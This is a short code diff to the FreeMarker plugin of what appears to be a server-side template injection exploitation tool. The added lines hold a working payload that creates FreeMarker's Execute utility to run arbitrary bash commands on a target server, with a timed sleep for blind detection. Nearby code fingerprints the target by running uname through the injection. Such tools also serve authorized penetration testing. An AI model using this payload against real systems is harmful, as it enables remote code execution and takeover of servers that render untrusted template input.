@@ -31,16 +31,17 @@ class Freemarker(Plugin):
             'call': 'render',
             'evaluate': '- %(code)s'
         },
+        # Prepared to used only for blind detection. Not useful for time-boolean
+        # tests (since && characters can\'t be used) but enough for the detection phase.
         'blind' : {
             'call': 'execute_blind',
-            'bool_true' : 'sleep',
-            'bool_false' : 'echo'
+            'bool_true' : 'true',
+            'bool_false' : 'false'
         },
-        # Prepared to used only for blind detection. Not useful for time-boolean 
-        # tests (since && characters can\'t be used) but enough for the detection phase.
+        # Not using execute here since it's rendered and requires set headers and trailers
         'execute_blind' : {
-            'call': 'execute',
-            'execute_blind': """%(code)s %(delay)i"""
+            'call': 'inject',
+            'execute_blind': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c %(code)s&&{sleep,%(delay)s}") }"""
         },
         'execute' : {
             'call': 'render',
@@ -49,15 +50,15 @@ class Freemarker(Plugin):
 
     }
 
-    
+
     contexts = [
-    
+
 
         # Text context, no closures
         { 'level': 0 },
-    
+
         { 'level': 1, 'prefix': '%(closure)s}', 'suffix' : '', 'closures' : closures.java_ctx_closures },
-        
+
         # This handles <#assign s = %s> and <#if 1 == %s> and <#if %s == 1>
         { 'level': 2, 'prefix': '%(closure)s>', 'suffix' : '', 'closures' : closures.java_ctx_closures },
         { 'level': 5, 'prefix': '-->', 'suffix' : '<#--' },
@@ -90,7 +91,7 @@ class Freemarker(Plugin):
             self.set('os', self.execute("uname"))
             self.set('write', True)
             self.set('read', True)
-            
+
     def detect_blind_engine(self):
 
         if not self.get('blind'):
